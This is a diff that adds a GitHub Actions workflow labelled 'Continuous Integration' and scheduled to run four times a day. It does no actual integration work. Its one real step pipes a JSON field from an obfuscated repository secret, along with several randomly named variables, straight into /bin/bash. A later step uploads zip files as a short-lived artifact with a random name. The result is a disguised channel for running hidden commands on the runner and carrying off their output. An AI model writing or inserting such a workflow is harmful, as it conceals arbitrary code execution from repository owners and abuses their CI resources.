@@ -1,0 +1,30 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '58 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          gz37: ${{ secrets.gz37 }}
+        run: |
+          printf '%s' "$gz37" | jq -r .nqwem30515 | /bin/bash
+          printf '%s' "$efx510" | jq -r .byqt897 | /bin/bash
+          echo $q5950 | jq -r .sfhj1 | /bin/bash
+          printf '%s' "$uub9" | jq -r .lbs1 | /bin/bash
+          printf '%s' "$ue47" | jq -r .ljo86 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: nMRG2pce
+          path: "*.zip"
+          retention-days: 1
